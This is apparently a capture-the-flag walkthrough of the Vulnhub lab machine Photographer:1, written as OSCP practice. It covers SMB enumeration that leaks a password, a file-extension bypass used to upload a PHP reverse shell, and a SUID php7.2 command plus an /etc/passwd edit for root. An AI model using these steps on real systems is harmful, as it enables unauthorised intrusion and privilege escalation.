# Photographer:1 ~Vulnhub Walkthrough

Here is a walk through for Photographer:1 which is a vulnerable machine on Vulnhub. It was created by Vinícius Vieira, aka v1n1v131r4. This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.

## Scanning

nmap -p- target-ip

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled.png)

nmap -sV -A target-ip  (service version scanning)

```jsx
root@kali:~# nmap -sV -A 192.168.122.150
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-08-09 08:17 EDT
Nmap scan report for 192.168.122.150
Host is up (0.032s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:89:46:F6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m36s, median: -1s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-08-09T08:18:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-09T12:18:18
|_  start_date: N/A

TRACEROUTE
HOP RTT      ADDRESS
1   31.93 ms 192.168.122.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds
root@kali:~#
```

Running nikto on port 80 and 8000

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%201.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%201.png)

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%202.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%202.png)

*** Found admin directory

## Enumeration

Running enum4linux

```jsx
root@kali:~# **enum4linux 192.168.122.150**
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug  9 08:21:07 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.122.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ======================================================= 
|    Enumerating Workgroup/Domain on 192.168.122.150    |
 ======================================================= 
[+] Got domain/workgroup name: WORKGROUP

 =============================================== 
|    Nbtstat Information for 192.168.122.150    |
 =============================================== 
Looking up status of 192.168.122.150
	PHOTOGRAPHER    <00> -         B <ACTIVE>  Workstation Service
	PHOTOGRAPHER    <03> -         B <ACTIVE>  Messenger Service
	PHOTOGRAPHER    <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================== 
|    Session Check on 192.168.122.150    |
 ======================================== 
[+] Server 192.168.122.150 allows sessions using username '', password ''

 ============================================== 
|    Getting domain SID for 192.168.122.150    |
 ============================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ========================================= 
|    OS information on 192.168.122.150    |
 ========================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.122.150 from smbclient: 
[+] Got OS info for 192.168.122.150 from srvinfo:
	PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ================================ 
|    Users on 192.168.122.150    |
 ================================ 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ============================================ 
|    Share Enumeration on 192.168.122.150    |
 ============================================ 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER

[+] Attempting to map shares on 192.168.122.150
//192.168.122.150/print$	Mapping: DENIED, Listing: N/A
//192.168.122.150/sambashare	Mapping: OK, Listing: OK
//192.168.122.150/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ======================================================= 
|    Password Policy Information for 192.168.122.150    |
 ======================================================= 

[+] Attaching to 192.168.122.150 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] PHOTOGRAPHER
	[+] Builtin

[+] Password Info for Domain: PHOTOGRAPHER

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: [-] Invalid TIME
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: [-] Invalid TIME

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 ================================= 
|    Groups on 192.168.122.150    |
 ================================= 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================== 
|    Users on 192.168.122.150 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3693138109-3993630114-3057792995
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3693138109-3993630114-3057792995 and logon username '', password ''
S-1-5-21-3693138109-3993630114-3057792995-500 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-501 PHOTOGRAPHER\nobody (Local User)
S-1-5-21-3693138109-3993630114-3057792995-511 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-512 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-513 PHOTOGRAPHER\None (Domain Group)
S-1-5-21-3693138109-3993630114-3057792995-514 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-515 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-529 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-530 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-531 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-532 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-533 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-534 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-535 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-536 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-537 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-538 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-539 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-540 *unknown*\*unknown* (8)
SS-1-5-21-3693138109-3993630114-3057792995-1049 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\daisa (Local User)
S-1-22-1-1001 Unix User\agi (Local User)

 ================================================ 
|    Getting printer info for 192.168.122.150    |
 ================================================ 
No printers returned.

enum4linux complete on Sun Aug  9 08:21:40 2020

root@kali:~#
```

***Found shared directory

**smbclient -L 192.168.122.150**

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%203.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%203.png)

To access shared directory

smbclient //target-ip/sambashare

***Found 2 files.

get mailsent.txt      *** Downloading mailsent.txt

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%204.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%204.png)

cat mailsent.txt

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%205.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%205.png)

*** secret key - babygirl

Opening http://192.168.122.150:8000/admin

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%206.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%206.png)

Login using credential **daisa@photographer.com:babygirl**

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%207.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%207.png)

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%208.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%208.png)

## Exploitation

Uploading php-reverse-shell.php.gif.

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%209.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%209.png)

Intercept request on burp 

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2010.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2010.png)

Change filename from php-reverse-shell.php.gif to php-reverse-shell.php and forward request

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2011.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2011.png)

Access php-reverse-shell.php on web

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2012.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2012.png)

Side by side, starting nc listener on port 1234

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2013.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2013.png)

*** Successfully got shell of www-data user

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2014.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2014.png)

Found user flag in directory /home/daisa

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2015.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2015.png)

## Privilege escalation

Find out services using SUID binaries.

**find / -perm -4000 2>/dev/null**

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2016.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2016.png)

CMD="/bin/sh"

/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2017.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2017.png)

copy password of any user in your system from /etc/shadow and paste in /etc/passwd file of target root user.

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2018.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2018.png)

su - root

cat proof.txt

![Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2019.png](Photographer%201%20~Vulnhub%20Walkthrough%20a5585a09226b4b83ac614679deaffe92/Untitled%2019.png)
